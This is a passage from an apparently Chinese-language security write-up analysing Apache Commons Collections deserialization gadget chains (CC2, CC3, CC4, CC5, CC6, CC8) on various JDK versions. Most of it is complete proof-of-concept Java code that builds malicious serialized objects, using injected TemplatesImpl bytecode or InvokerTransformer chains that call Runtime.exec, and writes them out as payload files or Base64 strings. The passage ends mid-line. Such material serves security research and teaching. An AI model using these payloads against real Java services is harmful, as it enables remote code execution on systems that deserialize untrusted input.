而jdk1.8下真实存在此属性(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses) 至于CommonCollections链下有时不需要此类的原因, 是因为通过proprityQueue类通过field方式添加值时其_tfactory最终会自己赋值为TransformerFactoryImpl实例 在Java中，对象的序列化可以通过实现两种接口来实现，若实现的是Serializable接口，则所有的序列化将会自动进行，若实现的是Externalizable接口，则没有任何东西可以自动序列化，需要在writeExternal方法中进行手工指定所要序列化的变量，这与是否被transient修饰无关 详细可参考: https://www.cnblogs.com/lanxuezaipiao/p/3369962.html private void readObject(ObjectInputStream is) throws IOException, ClassNotFoundException { SecurityManager security = System.getSecurityManager(); if (security != null){ String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET); if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(\"true\"))) { ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR); throw new UnsupportedOperationException(err.toString()); } } // We have to read serialized fields first. ObjectInputStream.GetField gf = is.readFields(); _name = (String)gf.get(\"_name\", null); _bytecodes = (byte[][])gf.get(\"_bytecodes\", null); _class = (Class[])gf.get(\"_class\", null); _transletIndex = gf.get(\"_transletIndex\", -1); _outputProperties = (Properties)gf.get(\"_outputProperties\", null); _indentNumber = gf.get(\"_indentNumber\", 0); if (is.readBoolean()) { _uriResolver = (URIResolver) is.readObject(); } // 反序列化时会自动给_tfactory赋值TransformerFactoryImpl对象 _tfactory = new TransformerFactoryImpl(); } 而通过一下这种方式赋值则会提前在序列化处进入compare方法 PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator); // 通过add建立size为2的数组 priorityQueue.add(templates);priorityQueue.add(templates); 跟进priorityQueue的方法: add > offer > siftUp private void siftUp(int k, E x) { if (comparator != null) siftUpUsingComparator(k, x); else siftUpComparable(k, x); } 这里会去判断comparator是否为空, 因为我们初始化的时候加入了, 所以跟进siftUpUsingComparator方法 private void siftUpUsingComparator(int k, E x) { while (k > 0) { int parent = (k - 1) >>> 1; Object e = queue[parent]; // 序列化时提前触发了compare方法 if (comparator.compare(x, (E) e) >= 0) break; queue[k] = e; k = parent; } queue[k] = x; } 这就导致还未经过反序列化, 在序列化的时候因为_tfactory没有赋值, 报错退出, 后续的也不会执行, 如果提前赋值的话相当于直接序列化时触发了结果, 所以需要设置无害的InvokerTransformer方法, 等序列化完成后再通过作用域修改, 这也是CommonsCollection2的另一种写法 package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections2 { public static void main(String[] args) throws Exception{ // 实例化一个无害的InvokerTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); // 实例化一个TransformingComparator对象，并且传入了invokerTransformer，需要注意TransformingComparator中的compare方法 TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer); // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = TemplatesImpl.class.newInstance(); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); // 实例化PriorityQueue对象 PriorityQueue priorityQueue = new PriorityQueue(2, transformingComparator); // 通过add建立size为2的数组 priorityQueue.add(templates);priorityQueue.add(templates); // 修改作用域使其可触发 setFieldValue(invokerTransformer, \"iMethodName\", \"newTransformer\"); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC5_BadAttributeValueExpException 适用版本：3.1-3.2.1，jdk1.8 CC1了解了CC5就不会特别难, 主要是针对jdk1.8之后AnnotationInvocationHandler移除memberValue.setValue导致链子失效而采取的BadAttributeValueExpException进行LazyMap的get调用, 更改的步骤主要如下: BadAttributeValueException.readObject -> TiedMapEntry.toString -> TiedMapEntry.getValue -> (this.map.get)LazyMap.get -> ChainedTransformer.transform jdk1.8中BadAttributeValueExpException重写了readObject方法 private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); // val的值赋给valObj Object valObj = gf.get(\"val\", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { // valObj为TiedMapEntry, 即调用TiedMapEntry.toString val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); } } 跟进TiedMapEntry.toString public String toString() { // 跟进getValue方法 return this.getKey() + \"=\" + this.getValue(); } ... public Object getValue() { // this.map赋值为LazyMap, 调用LazyMap.get return this.map.get(this.key); } 跟进LazyMap.get public Object get(Object key) { if (!super.map.containsKey(key)) { // 此处key赋值为ChainTransformer触发命令执行 Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC5_BadAttributeValueExpException{ public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); /** * BadAttributeValueException.readObject -> * TiedMapEntry.toString -> * TiedMapEntry.getValue -> * (this.map.get)LazyMap.get -> * ChainedTransformer.transform * */ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); // setFieldValue(badAttributeValueExpException, \"val\", tiedMapEntry); //调用CC2写好的设置函数 // 单独设置 Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(badAttributeValueExpException); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } JDK1.8 AnnotationInvocationHandler 修改 50行左右移除 memberValue.setValue CC3_InstantiateTransformer 适用版本：3.1-3.2.1，jdk7u21及以前 InstantiateTransformer public Object transform(Object input) { try { if (input instanceof Class == false) { throw new FunctorException( \"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName())); } Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\"InstantiateTransformer: The constructor must exist and be public \"); } catch (InstantiationException ex) { throw new FunctorException(\"InstantiateTransformer: InstantiationException\", ex); } catch (IllegalAccessException ex) { throw new FunctorException(\"InstantiateTransformer: Constructor must be public\", ex); } catch (InvocationTargetException ex) { throw new FunctorException(\"InstantiateTransformer: Constructor threw an exception\", ex); } } transform方法会去使用反射实例化一个对象并且返回 TrAXFilter public TrAXFilter (Templates templates) throws TransformerConfigurationException { m_templates = templates; m_transformer = (TransformerImpl)templates.newTransformer(); } 调用了传入参数的newTransformer()方法, 延续了CC2的构造恶意Class类进行命令执行, 传入精心构造的TransformerImpl类即可 POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC3_InstantiateTransformer { public static void main(String[] args) throws Exception{ // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 创建TemplatesImpl实例 Object templatesImpl=Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); // 通过反射设置字段的值为二维字节数组 setFieldValue(templatesImpl, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templatesImpl, \"_name\", \"name\"); /** CC3 TrAXFilter与InstantiateTransformer结合*/ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); Object cc3 = constructor.newInstance(Retention.class, ProxyMap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(cc3); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC4_mixed with CC2 and CC3 适用版本：4.0，jdk7u21及以前 CC4链中在这段代码中就做了一个简单的修改。 /**CommonsCollections4区别之处*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); 第一步是new了一个ConstantTransformer对象存储在Transformer[]数组中传入的参数是TrAXFilter.class，如果调用到ConstantTransformer实例化对象的transform方法会直接返回一个TrAXFilter对象。 第二步new了一个InstantiateTransformer对象传入的是Templates.class和构造的恶意templates实例化对象。 第三步是使用了ChainedTransformer的修饰器将Transformer[]数组传入参数，当调用transform方法将给Transformer[]数组给遍历调用transform方法。 第四步将ChainedTransformer修饰后的对象再使用TransformingComparator修饰器给修饰一遍，这里再使用TransformingComparator来修饰一下，这样等调用到该实例化对象的compare方法的时候就会去遍历调用Transformer[]的transform方法。(要求必须是Comparator才可赋值this.comparator) POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception{ // 实例化PriorityQueue对象 PriorityQueue priorityQueue = new PriorityQueue(1); // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = (TemplatesImpl) Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); /**CommonCollections4区别之处*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // 新建一个对象数组 Object[] queueArray = new Object[]{templates, 1}; // 反射设置PriorityQueue的queue值 Field queueField = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queueField.setAccessible(true); queueField.set(priorityQueue, queueArray); // 反射设置PriorityQueue的size值 Field queueSize = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); queueSize.setAccessible(true); queueSize.set(priorityQueue, 2); // 反射设置PriorityQueue的comparator值 Field queueComparator = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); queueComparator.setAccessible(true); queueComparator.set(priorityQueue, transformingComparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC8_new readObject TreeBag 参考: https://www.anquanke.com/post/id/190472 8与2, 4的区别在于使用了新的readObject触发点TreeBag , 8可与2, 4结合使用 TreeBag.readObject private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); @SuppressWarnings(\"unchecked\") // This will fail at runtime if the stream is incorrect final Comparator comp = (Comparator) in.readObject(); // 重点在doReadObject和TreeMap super.doReadObject(new TreeMap(comp), in); } 跟进doReadObject protected void doReadObject(final Map map, final ObjectInputStream in) throws IOException, ClassNotFoundException { this.map = map; final int entrySize = in.readInt(); for (int i = 0; i 跟进Treemap.put函数 public V put(K key, V value) { Entry t = root; /*root初始化时为null private transient Entry root = null; 跟进if语句 */ if (t == null) { compare(key, key); // type (and possibly null) check root = new Entry<>(key, value, null); size = 1; modCount++; return null; } ... 跟进compare函数 final int compare(Object k1, Object k2) { /* 控制此处的comparator private final Comparator comparator; */ return comparator==null ? ((Comparable)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2); } 通过TransformingComparator.compare触发即可 POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class CommonsCollections8 { public static void main(String[] args) throws Exception{ // ClassPool是 CtClass 对象的容器。实例化一个ClassPool容器。 ClassPool classPool = ClassPool.getDefault(); // 向容器中的类搜索路径的起始位置插入AbstractTranslet.class，个人认为是方便让后面能够找到这个类 classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 使用容器新建一个CtClass，相当于新建一个class，类名为Evil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // 给这个类创建 static 代码块，并插入到类中 ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // 重新设置类名为一个随机的名字 ctClass.setName(className); // 给这个类添加一个父类，即继承该父类。 ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // 设置父类为AbstractTranslet，避免报错 // 将这个类输出到项目目录下 // ctClass.writeFile(\"./\"); // 将这个class转换为字节数组 byte[] classBytes = ctClass.toBytecode(); // 将字节数组放置到一个二维数组的第一个元素 byte[][] targetByteCodes = new byte[][]{classBytes}; // 实例化TemplatesImpl对象 TemplatesImpl templates = (TemplatesImpl) Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); /**CommonsCollections4区别之处*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); // 通过反射设置字段的值为二维字节数组 setFieldValue(templates, \"_bytecodes\", targetByteCodes); // 进入 defineTransletClasses() 方法需要的条件 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); /**CommonsCollections8区别之处*/ // 实例化TreeBag对象 TreeBag treeBag = new TreeBag(transformingComparator); // 将TemplatesImpl对象添加至TreeBag建立的TreeMap中 treeBag.add(templates); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } commons-collections:4.1及以上的改变 前面提到的CommonsCollections2,4,8，都是在commons-collections:4.0版本下才可以使用的。这里我们来看看为什么在4.1及以上版本无法利用！ 前面我们用到了InvokerTransformer和InstantiateTransformer作为中转，很真实，4.1版本这两个类都没有实现Serializable接口，导致我们在序列化时就无法利用这两个类。 public class InstantiateTransformer implements Transformer,T> { public class InvokerTransformer implements Transformer { CC6_HashSet 参考: https://www.anquanke.com/post/id/190468 主要目的是在HashSet.readObject触发HashMap.put后进而在TiedMapEntry.hashCode触发LazyMap.get HashSet.readObject() -> HashMap.put(key) => key.hashCode => TiedMapEntry.hashCode -> TiedMapEntry.getValue -> TiedMapEntry.map.get() => LazyMap.get() -> factory.transform() => ChainedTransformer.transform() -> 前文构造的Runtime.getRuntime().exec() POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); outerMap.remove(\"ricky\"); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(hashSet); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } 舍弃HashSet 因为可以直接调用HashMap.put, 可以舍弃HashSet.readObject这个多余的桥梁 触发失败问题 直接采用HashMap.put会在debug的时候遇到一个问题 // LazyMap.get此处的key值为keykey Object value = factory.transform(key); 因为在HashMap的put⽅法中，也有调⽤到 hash(key) public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 这⾥就导致 LazyMap 这个利⽤链在这⾥被调⽤了⼀遍，因为前⾯⽤了 fakeTransformers ，所以此时并没有触发命令执⾏，但实际上也对构造Payload产⽣了影响。 解决⽅法也很简单，只需要将keykey这个Key，再从outerMap中移除即可： outerMap.remove(\"keykey\") POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6_HashMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // 调用decorate主要是直接写入的方法是protected, 需要设置权限才行, 而该方法是public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); /*jdk1.7~jdk1.8*/ Map expMap = new HashMap(); expMap.put(tiedMapEntry, \"valuevalue\"); outerMap.remove(\"keykey\"); //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(expMap); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new 